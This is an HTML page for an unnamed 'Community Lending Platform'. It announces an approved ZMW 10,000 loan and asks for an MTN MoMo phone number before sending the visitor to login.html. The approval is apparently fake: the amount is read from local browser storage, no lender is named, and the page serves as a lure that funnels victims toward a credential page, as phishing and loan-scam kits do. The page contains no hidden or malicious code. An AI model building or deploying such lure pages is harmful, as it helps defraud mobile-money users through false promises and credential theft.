<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Loan Approved - Community Lending Platform</title>
  <style>
    :root {
      --bg-main: #0c332b;
      --card-bg: #13463b;
      --card-border: #1d5c4f;
      --text-white: #ffffff;
      --text-muted: #a3e635;
      --text-sub: #94a3b8;
      --accent-gold: #f59e0b;
      --accent-green: #22c55e;
      --input-bg: #092620;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: var(--bg-main);
      color: var(--text-white);
      line-height: 1.5;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 500px;
      padding: 1.5rem 1rem;
    }

    .approved-card {
      background-color: var(--card-bg);
      border-radius: 16px;
      border: 1px solid var(--card-border);
      padding: 2rem 1.5rem;
      text-align: center;
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
    }

    .success-icon {
      width: 70px;
      height: 70px;
      background-color: rgba(34, 197, 94, 0.15);
      border: 2px solid var(--accent-green);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 1.25rem auto;
      color: var(--accent-green);
      font-size: 2.2rem;
    }

    .title {
      font-size: 1.75rem;
      font-weight: 800;
      margin-bottom: 0.5rem;
    }

    .thank-you-msg {
      font-size: 0.95rem;
      color: #cbd5e1;
      margin-bottom: 1.5rem;
    }

    .loan-details-box {
      background-color: var(--input-bg);
      border: 1px dashed var(--card-border);
      border-radius: 12px;
      padding: 1.25rem;
      margin-bottom: 1.5rem;
      text-align: left;
    }

    .detail-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 0.75rem;
      font-size: 0.9rem;
    }

    .detail-row:last-child {
      margin-bottom: 0;
      padding-top: 0.75rem;
      border-top: 1px solid var(--card-border);
    }

    .detail-label {
      color: var(--text-sub);
    }

    .detail-value {
      font-weight: 700;
      color: var(--text-white);
    }

    .detail-value.highlight {
      color: var(--accent-green);
      font-size: 1.25rem;
    }

    .momo-section {
      text-align: left;
      margin-bottom: 1.5rem;
    }

    .momo-section label {
      display: block;
      font-size: 0.85rem;
      font-weight: 600;
      color: var(--text-sub);
      margin-bottom: 0.5rem;
    }

    .momo-input {
      width: 100%;
      padding: 0.875rem 1rem;
      background-color: var(--input-bg);
      border: 1px solid var(--card-border);
      border-radius: 8px;
      color: var(--text-white);
      font-size: 1rem;
      outline: none;
    }

    .momo-input:focus {
      border-color: var(--accent-green);
    }

    .btn-withdraw {
      width: 100%;
      background-color: var(--accent-gold);
      color: #000000;
      border: none;
      padding: 1rem;
      font-size: 1.1rem;
      font-weight: 800;
      border-radius: 25px;
      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      transition: opacity 0.2s ease;
    }

    .btn-withdraw:hover {
      opacity: 0.9;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="approved-card">
      <div class="success-icon">✓</div>
      
      <h1 class="title">Loan Approved!</h1>
      <p class="thank-you-msg">
        Thank you for choosing our platform. Your loan application has passed verification and is ready for instant disbursement.
      </p>

      <div class="loan-details-box">
        <div class="detail-row">
          <span class="detail-label">Approved Amount</span>
          <span class="detail-value highlight" id="displayAmount">ZMW 10,000</span>
        </div>
        <div class="detail-row">
          <span class="detail-label">Status</span>
          <span class="detail-value" style="color: var(--accent-green);">Ready to Transfer</span>
        </div>
        <div class="detail-row">
          <span class="detail-label">Disbursement Method</span>
          <span class="detail-value">MTN MoMo Mobile Wallet</span>
        </div>
      </div>

      <form action="login.html" method="GET">
        <div class="momo-section">
          <label for="momoNumber">MoMo Account Phone Number</label>
          <input 
            type="tel" 
            id="momoNumber" 
            name="momoNumber" 
            class="momo-input" 
            placeholder="09XXXXXXXX" 
            required 
          />
        </div>

        <button type="submit" class="btn-withdraw">Withdraw Funds</button>
      </form>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      const savedAmount = localStorage.getItem('approvedAmount');
      const savedCurrency = localStorage.getItem('approvedCurrency') || 'ZMW';

      if (savedAmount) {
        const formattedAmount = savedAmount.includes(savedCurrency) 
          ? savedAmount 
          : `${savedCurrency} ${parseFloat(savedAmount).toLocaleString()}`;
        
        document.getElementById('displayAmount').innerText = formattedAmount;
      }
    });
  </script>

</body>
</html>
